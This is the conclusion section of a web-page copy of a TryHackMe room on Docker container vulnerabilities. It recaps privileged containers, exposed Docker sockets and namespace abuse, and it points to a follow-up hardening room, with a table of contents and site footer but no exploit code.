<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-7-conclusion">Task 7 Conclusion<a href="#task-7-conclusion" class="hash-link" aria-label="Direct link to Task 7 Conclusion" title="Direct link to Task 7 Conclusion" translate="no">​</a></h2>
<p>Phew...that was fun! In today&#x27;s room, you learned about some possible misconfigurations with Docker containers, how to discover these, and ultimately exploit them.</p>
<p>Now, you might be wondering why it is the case that containers might run with privileges that effectively bypass the security mechanisms Docker introduces. Well, while it isn&#x27;t a recommended practice, there are use cases where containers do need this level of interaction. For example, running Docker within Docker, or specific applications such as firewalls that need to interact with the host&#x27;s iptables, or perhaps attached devices.</p>
<p>Ultimately, there is also an element of &quot;taking the quick/easy route out&quot; when trying to figure out what permissions to assign a container. Docker (especially in recent times) does a great job of hardening. For example, you can give a container specific capibilities on a allowlist-basis.  However, it isn&#x27;t too far-fetched to think that people would just give more than necessary capabilities to get something to work without realising the wider consequences.</p>
<p>We will come onto how you can prevent these misconfigurations and vulnerabilities in the next <strong>room</strong>, &quot;Container Hardening&quot;</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Click me to finish the room! </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col noPrint_WFHX"><a href="https://github.com/TryHackMyOffsecBox/TryHackMe-CN/tree/main/packages/create-docusaurus/templates/shared/docs/Modules/Container Security/Container Vulnerabilities.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/TryHackMe-CN/en/docs/Modules/Container Security/Intro to Kubernetes"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Intro to Kubernetes</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/TryHackMe-CN/en/docs/Modules/Container Security/Container Hardening"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Container Hardening</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#task-1-introduction-deploy" class="table-of-contents__link toc-highlight">Task 1 Introduction (Deploy)</a><ul><li><a href="#learning-objectives" class="table-of-contents__link toc-highlight">Learning Objectives</a></li><li><a href="#prerequisites" class="table-of-contents__link toc-highlight">Prerequisites</a></li><li><a href="#important-context" class="table-of-contents__link toc-highlight">Important Context</a></li><li><a href="#deploy-the-vulnerable-machine-for-this-room" class="table-of-contents__link toc-highlight">Deploy the Vulnerable Machine for This Room</a></li></ul></li><li><a href="#task-2-container-vulnerabilities-101" class="table-of-contents__link toc-highlight">Task 2 Container Vulnerabilities 101</a><ul><li><a href="#what-sort-of-vulnerabilities-can-we-expect-to-find-in-docker-containers" class="table-of-contents__link toc-highlight">What Sort of Vulnerabilities Can We Expect To Find in Docker Containers</a></li></ul></li><li><a href="#task-3-vulnerability-1-privileged-containers-capabilities" class="table-of-contents__link toc-highlight">Task 3 Vulnerability 1: Privileged Containers (Capabilities)</a><ul><li><a href="#understanding-capabilities" class="table-of-contents__link toc-highlight">Understanding Capabilities</a></li><li><a href="#what-does-this-mean-for-us" class="table-of-contents__link toc-highlight">What Does This Mean for Us</a></li><li><a href="#explaining-the-vulnerability" class="table-of-contents__link toc-highlight">Explaining the Vulnerability</a></li></ul></li><li><a href="#task-4-vulnerability-2-escaping-via-exposed-docker-daemon" class="table-of-contents__link toc-highlight">Task 4 Vulnerability 2: Escaping via Exposed Docker Daemon</a><ul><li><a href="#unix-sockets-101-one-size-fits-all" class="table-of-contents__link toc-highlight">Unix Sockets 101 (One Size Fits All)</a></li><li><a href="#how-does-docker-use-sockets" class="table-of-contents__link toc-highlight">How Does Docker Use Sockets</a></li><li><a href="#finding-the-docker-socket-in-a-container" class="table-of-contents__link toc-highlight">Finding the Docker Socket in a Container</a></li><li><a href="#exploiting-the-docker-socket-in-a-container" class="table-of-contents__link toc-highlight">Exploiting the Docker Socket in a Container</a></li><li><a href="#verify-success" class="table-of-contents__link toc-highlight">Verify Success</a></li></ul></li><li><a href="#task-5-vulnerability-3-remote-code-execution-via-exposed-docker-daemon" class="table-of-contents__link toc-highlight">Task 5 Vulnerability 3: Remote Code Execution via Exposed Docker Daemon</a><ul><li><a href="#the-docker-engine---tcp-sockets-edition" class="table-of-contents__link toc-highlight">The Docker Engine - TCP Sockets Edition</a></li><li><a href="#the-vulnerability" class="table-of-contents__link toc-highlight">The Vulnerability</a></li><li><a href="#enumerating-finding-out-if-a-device-has-docker-remotely-accessible" class="table-of-contents__link toc-highlight">Enumerating: Finding Out if a Device Has Docker Remotely Accessible</a></li><li><a href="#executing-docker-commands-on-our-target" class="table-of-contents__link toc-highlight">Executing Docker Commands on Our Target</a></li><li><a href="#what-now" class="table-of-contents__link toc-highlight">What Now</a></li></ul></li><li><a href="#task-6-vulnerability-4-abusing-namespaces" class="table-of-contents__link toc-highlight">Task 6 Vulnerability 4: Abusing Namespaces</a><ul><li><a href="#what-are-namespaces" class="table-of-contents__link toc-highlight">What Are Namespaces</a></li><li><a href="#determining-if-were-in-a-container-processes" class="table-of-contents__link toc-highlight">Determining if We&#39;re in a Container (Processes)</a></li><li><a href="#how-can-we-abuse-namespaces" class="table-of-contents__link toc-highlight">How Can We Abuse Namespaces</a></li><li><a href="#the-exploit" class="table-of-contents__link toc-highlight">The Exploit</a></li></ul></li><li><a href="#task-7-conclusion" class="table-of-contents__link toc-highlight">Task 7 Conclusion</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Docs</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/TryHackMe-CN/en/docs">Tutorial</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">Community</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/TryHackMyOffsecBox" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - TryHackMyOffsecBox<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li class="footer__item"><a href="https://github.com/CRONUS-Security" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github - CRONUS-Security<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 TryHackMyOffsecBox. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>